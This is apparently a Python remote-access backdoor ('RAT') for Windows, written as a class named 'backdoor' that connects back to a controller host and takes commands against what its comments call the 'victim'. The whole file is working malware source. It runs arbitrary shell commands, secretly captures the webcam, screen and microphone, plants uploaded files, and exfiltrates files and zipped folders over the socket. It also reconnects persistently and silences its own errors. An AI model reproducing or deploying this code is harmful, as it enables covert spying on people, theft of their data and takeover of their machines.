import os
import cv2
import sys
import time
import shlex
import shutil
import socket
import win32api
import platform
import subprocess


class backdoor:
    def __init__(self, server_adres, server_port):
        self.server_adres = server_adres
        self.server_port = server_port

        self.command_result = str()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    @staticmethod
    def executecommand(cmd):
        """
        Executes a command in the terminal and returns the output (stdout) or the error (stderr)
        Args:
            cmd (str): The command to execute.
        Returns:
            str: The output of the command or the error, or an empty string if there is no output or error.
        """

        if not cmd:
            return
        else:
            try:
                terminal_output = subprocess.run(shlex.split(cmd), shell=True, capture_output=True,
                                                 universal_newlines=True)
                output = terminal_output.stdout
                error = terminal_output.stderr
                if not output and not error:
                    return " "
                else:
                    if output:
                        return output
                    elif error:
                        return error
            except Exception as e:
                return str(e)

    @staticmethod
    def take_screen_shoot():
        # Import necessary modules
        import win32ui, win32api, win32con, win32gui

        # Define a helper function to get screen dimensions
        def _get_screen_dimensions():
            screen_width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            screen_height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
            screen_left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            screen_top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
            return screen_width, screen_height, screen_left, screen_top

        # Get the handle of the desktop window
        desktopWindowHandler = win32gui.GetDesktopWindow()
        # Get screen dimensions
        width, height, left, top = _get_screen_dimensions()

        # Create device contexts (DCs) for various purposes
        desktop_dc = win32gui.GetWindowDC(desktopWindowHandler)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()

        # Create a bitmap to store the screenshot
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)

        # Capture the screen content and save it to a file
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
        screenshot.SaveBitmapFile(mem_dc, "screenshot.bmp")

        # Clean up resources
        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())

    @staticmethod
    def read_file_data(src: str) -> bytes:
        try:
            file_data = b''
            with open(src, "rb") as file:
                while True:
                    dt = file.read(4096)
                    file_data += dt
                    if not dt:
                        break
        except Exception:
            return " ".encode()
        return file_data

    @staticmethod
    def receive_socket_data(sock, data_length):
        try:
            current_length = 0
            data = b''
            while current_length < data_length:
                chuck_size = data_length - current_length
                if chuck_size > 4096:
                    chuck_size = 4096
                received_data = sock.recv(chuck_size)
                if not received_data:
                    return None
                elif not data:
                    data = received_data
                else:
                    data += received_data
                current_length += len(received_data)
            return data
        except ConnectionResetError:
            pass

    @staticmethod
    def record_sound_from_microphone(record_sec: int):
        """
        Records audio from the microphone and saves it to a WAV file.
        Args:
            record_sec (int): Duration of recording in seconds.
        Returns:
            bytes: Audio data read from the saved WAV file.
        """

        import wave, pyaudio

        # Set parameters for recording
        chunck = 1024
        channels = 1
        rate = 44100
        record_sec = record_sec
        output_filename = "record.wav"
        record_format = pyaudio.paInt16

        # Initialize PyAudio
        Rec = pyaudio.PyAudio()

        # Open a stream for recording
        stream = Rec.open(format=record_format,
                          channels=channels,
                          rate=rate,
                          input=True,
                          frames_per_buffer=chunck)
        frames = []
        for i in range(0, int(rate / chunck * record_sec)):
            data = stream.read(chunck)
            frames.append(data)

        # Stop and close the stream
        stream.stop_stream()
        stream.close()
        Rec.terminate()

        # Save recorded frames to a WAV file
        output_wave_file = wave.open(output_filename, 'wb')
        output_wave_file.setnchannels(channels)
        output_wave_file.setsampwidth(Rec.get_sample_size(record_format))
        output_wave_file.setframerate(rate)
        output_wave_file.writeframes(b''.join(frames))
        output_wave_file.close()

        return backdoor.read_file_data(output_filename)

    def run(self):
        while True:
            try:
                self.socket.connect((self.server_adres, self.server_port))
            except Exception:
                time.sleep(1800)
            else:
                break

        while True:
            command_handshake_size = backdoor.receive_socket_data(self.socket, 13)
            command = backdoor.receive_socket_data(self.socket, int(command_handshake_size.decode()))
            if not command:
                break
            elif command[:15] == b'xhc-upload-xhc.':
                file_name_length = command[15:21]
                uploaded_file_name = command[21:(21 + int(file_name_length))]
                with open(uploaded_file_name, "wb") as f:
                    f.write(command[(21 + int(file_name_length)):])
                self.command_result = "[ * ] The file was successfully uploaded".encode()
            else:
                command = (command.decode()).strip()
                command_split = command.split(" ")
                dl = " ".join(command_split[1:])
                del command_split[1:]
                command_split.append(dl)

                if command.lower() == "get_info":  # Get information about the target computer
                    self.command_result = f"{platform.platform()} :: {os.getcwd()}".encode()

                elif command.lower() == "try_connection":
                    self.command_result = b" "

                elif command.lower() == "exit":
                    break

                elif command.lower() == "camshoot":
                    '''Takes a photo with the victim's camera'''

                    pict = cv2.VideoCapture(0)
                    ret, frame_data = pict.read()
                    cv2.imwrite("shoot.jpg", frame_data)
                    pict.release()
                    self.command_result = backdoor.read_file_data("shoot.jpg")
                    os.remove("shoot.jpg")

                elif command_split[0].lower() == "execute":
                    '''Execute  a commande on victim's computer'''
                    os.popen(command_split[1])

                elif command.lower() == "screenshoot":
                    '''Take a screenShoot'''
                    if sys.platform == "win32":
                        backdoor.take_screen_shoot()
                        self.command_result = backdoor.read_file_data("screenshot.bmp")
                        os.remove("screenshot.bmp")
                    else:
                        self.command_result = "[ ! ] This command only works on Windows systems".encode()

                elif command.lower() in ["disk_partitions", "disk partitions"]:
                    '''if victim's system a windows, this condition can be used to get a list of partitions
                    on the hard drive'''
                    if sys.platform == "win32":
                        drive_list = win32api.GetLogicalDriveStrings()
                        drive_list = (str(drive_list)).split("\x00")
                        drive_list = " ".join(drive_list)
                        self.command_result = f"[ * ] The partitions on the system are: {drive_list}".encode()
                    else:
                        self.command_result = "[ ! ] This command only works on Windows systems".encode()
                elif command_split[0].lower() == "record":
                    '''
                    Make an audio recording for x time on the victim's computer
                    '''
                    self.command_result = backdoor.record_sound_from_microphone(record_sec=int(command_split[1]) + 1)
                    os.remove("record.wav")

                elif command_split[0].lower() == "cd":
                    try:
                        os.chdir(command_split[1].strip(" \" "))
                        self.command_result = " "
                    except (FileNotFoundError, OSError):
                        self.command_result = "[ ! ] Le Nom du répertoire est invalide"
                    self.command_result = self.command_result.encode()

                elif command_split[0].lower() == "download":
                    '''
                    if args == -f: download a file on victim's computer
                    elif args == -d: download a folder on victim's computer
                    '''

                    if command_split[1][:2] == "-f" and os.path.isfile(os.path.join(os.getcwd(), command_split[1][3:])):
                        self.command_result = backdoor.read_file_data((command_split[1][2:]).strip())
                    elif command_split[1][:2] == "-d" and os.path.isdir(
                            os.path.join(os.getcwd(), command_split[1][3:])):
                        make_zip_file = shutil.make_archive("downloadZip", "zip", (command_split[1][2:]).strip())
                        self.command_result = backdoor.read_file_data(make_zip_file)
                        os.remove(make_zip_file)
                    else:
                        self.command_result = " ".encode()
                else:
                    self.command_result = backdoor.executecommand(command)
                    self.command_result = self.command_result.encode()

            len_data = len(self.command_result)
            data_handShake_size = str(len_data).zfill(13)
            self.socket.sendall(data_handShake_size.encode())
            if not len_data == 0:
                self.socket.sendall(self.command_result)

        self.socket.detach()
        self.socket.close()


if __name__ == "__main__":
    try:
        backdoor('localhost', 4275).run()
    except Exception as e:
        sys.exit(0)

